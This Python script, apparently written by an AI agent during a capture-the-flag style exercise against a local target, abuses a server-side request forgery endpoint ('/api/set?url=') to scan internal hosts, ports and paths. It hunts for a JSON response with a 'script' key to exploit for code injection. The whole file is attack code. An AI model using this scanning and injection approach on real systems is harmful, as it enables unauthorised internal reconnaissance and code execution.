import requests
import json

target_base = "http://127.0.0.1:32985"

# Let me try some different free JSON hosting services

# 1. jsonbin.io - requires API key for creation, but maybe we can use existing?
# 2. myjson.com - similar
# 3. jsonstorage.net - similar

# Actually, let me try to find if there's an ANY internal endpoint that we haven't found
# that would return JSON

print("[+] Comprehensive internal service scan...")

# Scan internal services for any JSON-returning endpoints
ports = [80, 8080, 8081, 3000, 5000, 9000]
hosts = ["nginx", "flask_api", "flask_app", "127.0.0.1", "localhost"]
paths = ["/", "/api", "/json", "/script", "/data", "/config", "/status", "/health"]

for host in hosts:
    for port in ports:
        for path in paths:
            url = f"http://{host}:{port}{path}"
            try:
                set_resp = requests.get(f"{target_base}/api/set?url={url}", timeout=2)
                app_resp = requests.get(f"{target_base}/app", timeout=3)
                
                # Look for JSON decode error (means we got something that's not JSON)
                # or KeyError: 'script' (means we got JSON without script key)
                if "KeyError" in app_resp.text and "script" in app_resp.text:
                    print(f"\n[+] KeyError for 'script' at: {url}")
                    # This means the endpoint returns JSON but without 'script' key
                    # Let me extract what keys it has
                    # But actually this could also be our HTML response...
                    pass
                    
                if app_resp.status_code == 200:
                    print(f"\n[!] 200 OK: {url}")
                    # Check if it's valid JSON by looking for common JSON patterns
                    if "{" in app_resp.text and "}" in app_resp.text:
                        print(f"    JSON-like response found!")
                        print(f"    Response: {app_resp.text[:500]}")
                        
                        # Check if it has a 'script' key we could exploit
                        try:
                            # Extract just the JSON part
                            import re
                            json_match = re.search(r'\{[^}]*\}', app_resp.text)
                            if json_match:
                                data = json.loads(json_match.group())
                                if 'script' in data:
                                    print(f"    [!] Has 'script' key: {data['script']}")
                        except:
                            pass
                            
            except Exception as e:
                pass  # Skip errors silently

print("\n[+] Scan complete")

